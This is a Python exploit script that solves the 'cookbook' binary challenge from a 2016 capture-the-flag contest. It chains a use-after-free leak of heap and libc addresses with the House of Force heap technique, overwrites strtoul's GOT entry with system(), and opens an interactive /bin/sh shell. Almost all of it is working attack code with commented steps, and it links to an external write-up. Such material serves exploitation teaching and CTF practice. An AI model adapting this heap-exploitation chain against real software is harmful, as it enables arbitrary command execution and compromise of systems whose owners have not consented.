# full writeup: http://rh0gue.com/bkpctf16/cookbook
#!/usr/bin/python
import os, sys, socket
import struct
import telnetlib

PUTS_GOT = 0x0804d030
STRTOUL_GOT = 0x0804d038
PUTS_OFFSET = 0x65650
SYSTEM_OFFSET = 0x40190
WILDERNESS_OFFSET = 0x1af0 # distance from heap base addr to wilderness chunk DATA addr

def p(v):
    return struct.pack('<I', v)

def u(v):
    return struct.unpack('<I', v)[0]

def conn():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #s.connect(('cookbook.bostonkey.party',5000))
    s.connect(('127.0.0.1', 1337))
    f = s.makefile('w', bufsize=0)
    return s, f

def readuntil(f, delim='[q]uit\n'):
  data = ''
  while not data.endswith(delim):
    data += f.read(1)
  return data

def interact():
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

s, f = conn()

print "[+] STAGE 1"
payload  = 'AAAA\n'
readuntil(f, "what's your name?")
f.write(payload)
readuntil(f)
f.write("c\n")
readuntil(f)
f.write("n\n")
readuntil(f)
f.write("g\n")

# UAF to leak heap chunk addr
f.write("A"*4+"\n")
readuntil(f)
f.write("a\n") # note: adding an ingredient calloc()'s two chunks on top of recipe chunk
readuntil(f, "?")
f.write("basil\n")
readuntil(f, "?")
f.write("1\n") # set to 1 so that the address of puts() can be leaked later via the "total cals" since program multiplies cals per ingredient by number of ingred in recipe to get total
readuntil(f)
f.write("d\n")
readuntil(f)
f.write("p\n")
leaked_chunk = hex(int(readuntil(f," - ").split('\n')[4].split(' ')[0]))
heap_base = hex(int(leaked_chunk,16)-0x16d8)   
print "[*] leaked heap chunk found at address "+str(leaked_chunk)
print "[*] calculated heap base found at address "+str(heap_base)

leaked_recipe = hex(int(leaked_chunk,16)-0x6d8+0x2b0)
leaked_recipe_offset_8 = int(leaked_recipe,16)+0x8
leaked_recipe_ingred_num = int(leaked_chunk,16)-0x8

# UAF to allocate another chunk of the same size as recipe (0x40c) to replace previously freed recipe chunk
# leak puts() addr
readuntil(f)
f.write("q\n")
readuntil(f)
f.write("g\n")
readuntil(f, ":")
f.write("40c\n") # size of recipe chunk
# overwrite the previous ingredient ptr(offset + 0x0) and the previous ingredient size ptr(offset + 0x4). craft pointer to puts@GOT on (offset + 0x8) 
f.write(p(leaked_recipe_offset_8)+p(leaked_recipe_ingred_num)+p(PUTS_GOT)+"\x00"*(0x40c-0x4-0x4-0x4)+"\n")
readuntil(f)
f.write("c\n")
readuntil(f,"[n]")
f.write("p\n")
puts_addr = hex(int(readuntil(f,"[n]").split('\n')[14].split(' ')[3]))
libc_base = hex(int(puts_addr,16)-PUTS_OFFSET)
system_addr = int(libc_base,16)+SYSTEM_OFFSET
print "[*] leaked puts() found at address "+str(puts_addr)
print "[*] calculated libc_base addr at address "+str(libc_base)
print "[*] calculated system() found at address "+str(hex(system_addr))

# house of force heap exploit technique
'''
https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/
https://sploitfun.wordpress.com/2015/03/04/heap-overflow-using-malloc-maleficarum/
'''
print ""
print "[+] STAGE 2"
wilderness_addr=int(heap_base,16)+WILDERNESS_OFFSET
print "[*] calculated wilderness chunk found at address "+str(hex(wilderness_addr))
readuntil(f)
f.write("n\n") # 1st HOF malloc() to create a new heap chunk next to wilderness chunk + overflow to corrupt wilderness chunk size
readuntil(f)
print "[*] overwriting wilderness chunk size w/0xffffffff" # so that mmap() is not called in order to extend the heap
f.write("g\n")
f.write("A"*(1036-0x8c)+"\xff"*4+"\n") # overwrite wilderness chunk size w/ "0xffffffff"
readuntil(f)
f.write("q\n")
readuntil(f)

# main_menu
hof_size_2 = format((STRTOUL_GOT-8-(wilderness_addr))&0xffffffff,'x')
print "[*] allocating second HOF chunk with size "+str(hex(int(hof_size_2,16)))

f.write("g\n")
readuntil(f, ":")
f.write(hof_size_2+"\n") # specify size of 2nd HOF malloc() to be `GOT_entry - 8 byte - addr of top chunk`
readuntil(f)

# main_menu
print "[*] overwriting strtoul@GOT with system()"
f.write("g\n") # 3rd HOF malloc() chunk overwrites PUTS_GOT
readuntil(f, ":")
f.write("5\n") # size of last chunk. 4 byte addr + 1 byte newline char
f.write(p(system_addr)+"\n")
readuntil(f)

# call strtoul() and push '/bin/sh' onto stack
f.write("g\n")
readuntil(f, ":")
f.write("/bin/sh\n")

print ""
print "[+] OPENING SHELL..."

interact()

f.close()
s.close()
